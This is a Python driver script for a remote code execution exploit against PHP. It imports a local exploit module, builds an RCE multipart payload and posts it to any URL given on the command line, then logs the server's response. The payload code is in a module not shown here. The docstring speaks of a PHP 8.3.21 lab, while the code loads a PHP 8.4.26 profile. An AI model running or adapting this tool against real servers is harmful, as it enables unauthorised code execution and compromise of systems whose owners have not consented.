#!/usr/bin/env python3
"""Send the generic terminal A request to the isolated PHP 8.3.21 lab."""

from __future__ import annotations

import argparse
import dataclasses
from pathlib import Path
import sys


HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

import exploit_generic as exploit  # noqa: E402


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--host-header")
    parser.add_argument("--profile-json")
    parser.add_argument("--set", action="append", default=[], dest="assignments")
    parser.add_argument("--output", type=Path)
    args = parser.parse_args()

    profile = exploit.load_profile(
        "php-8.4.26-amd64", args.profile_json, args.assignments
    )
    target = exploit.Target.parse(args.url)
    if args.host_header:
        target = dataclasses.replace(target, host_header=args.host_header)
    client = exploit.RawHTTP(
        target,
        timeout=90.0,
        retries=3,
        retry_delay=0.25,
        insecure=False,
        log=exploit.Log(1),
    )
    body, boundary = exploit.build_rce_a(profile)
    response = client.post_multipart(body, boundary, expected_abort=True)
    if args.output:
        args.output.parent.mkdir(parents=True, exist_ok=True)
        args.output.write_bytes(response)
    first_line = response.splitlines()[0] if response else b""
    print(
        f"A status={first_line.decode('latin1', 'replace')!r} "
        f"response={len(response)} pad_n={profile.rce_a_pad_n}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
